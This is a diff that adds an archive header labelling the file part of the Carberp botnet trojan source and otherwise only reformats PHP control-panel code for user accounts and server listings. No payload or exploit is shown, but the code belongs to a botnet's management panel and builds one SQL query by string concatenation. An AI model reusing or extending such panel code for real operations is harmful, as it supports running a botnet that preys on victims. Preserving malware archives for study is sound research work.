@@ -1,8 +1,21 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-function uh_load($row){	global $uh;
+function uh_load($row){
+	global $uh;
 	$row->config = json_decode($row->config);
-	if($row->config->sbbc == true){		$uh[$row->id] = $row;
+	if($row->config->sbbc == true){
+		$uh[$row->id] = $row;
 	}
 }
 
@@ -26,7 +39,8 @@ $user = $mysqli->query('SELECT * FROM bf_users WHERE (id<>\'0\') AND (id=\''.$Cu
 $user->access = json_decode($user->access, true);
 $user->config = json_decode($user->config, true);
 
-if(empty($user->config['lang'])){	$user->config['lang'] = $config['lang'];
+if(empty($user->config['lang'])){
+	$user->config['lang'] = $config['lang'];
 }
 
 if(isset($_POST['save'])){
@@ -56,7 +70,8 @@ if(isset($_POST['save'])){
 
 	if(!empty($_POST['lang'])) $_SESSION['user']->config['lang'] = $_POST['lang'];
 
-	header('Location: /accounts/');	exit;
+	header('Location: /accounts/');
+	exit;
 }
 
 $servers = $mysqli->query('SELECT `id`, `name`, `ip` FROM bf_servers');
